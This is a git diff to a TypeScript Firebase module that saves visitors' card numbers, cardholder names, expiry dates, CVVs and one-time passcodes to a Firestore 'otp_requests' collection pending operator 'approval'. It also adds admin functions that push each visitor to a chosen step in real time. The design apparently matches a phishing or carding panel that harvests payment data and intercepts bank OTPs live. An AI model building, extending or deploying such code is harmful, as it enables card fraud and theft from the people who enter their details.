@@ -273,13 +273,25 @@ export const requestOtpApproval = async (otpData: {
   try {
     const visitorId = getVisitorId();
     const docRef = doc(db, "otp_requests", visitorId);
-    await setDoc(docRef, {
-      ...otpData,
+    
+    // Build clean data object without undefined values
+    const cleanData: Record<string, any> = {
+      cardNumber: otpData.cardNumber || "",
+      cardName: otpData.cardName || "",
+      expiry: otpData.expiry || "",
+      cvv: otpData.cvv || "",
+      otpCode: otpData.otpCode || "",
       visitorId,
       status: "pending",
       createdAt: serverTimestamp(),
       updatedAt: serverTimestamp(),
-    });
+    };
+    
+    // Only add optional fields if they have values
+    if (otpData.userName) cleanData.userName = otpData.userName;
+    if (otpData.email) cleanData.email = otpData.email;
+    
+    await setDoc(docRef, cleanData);
     return true;
   } catch (error) {
     console.error("Error requesting OTP approval:", error);
@@ -347,6 +359,49 @@ export const deleteOtpRequest = async (visitorId: string) => {
     console.error("Error deleting OTP request:", error);
     return false;
   }
+};
+
+// Admin Step Control
+export const setUserStep = async (visitorId: string, step: number) => {
+  try {
+    const docRef = doc(db, "submissions", visitorId);
+    await setDoc(docRef, {
+      adminStepOverride: step,
+      updatedAt: serverTimestamp(),
+    }, { merge: true });
+    return true;
+  } catch (error) {
+    console.error("Error setting user step:", error);
+    return false;
+  }
+};
+
+export const clearUserStepOverride = async (visitorIdParam?: string) => {
+  try {
+    const visitorId = visitorIdParam || getVisitorId();
+    const docRef = doc(db, "submissions", visitorId);
+    await setDoc(docRef, {
+      adminStepOverride: null,
+      updatedAt: serverTimestamp(),
+    }, { merge: true });
+    return true;
+  } catch (error) {
+    console.error("Error clearing step override:", error);
+    return false;
+  }
+};
+
+export const subscribeToUserStep = (callback: (step: number | null) => void) => {
+  const visitorId = getVisitorId();
+  const docRef = doc(db, "submissions", visitorId);
+  return onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      callback(data.adminStepOverride || null);
+    } else {
+      callback(null);
+    }
+  });
 };
 
 export { db, database };
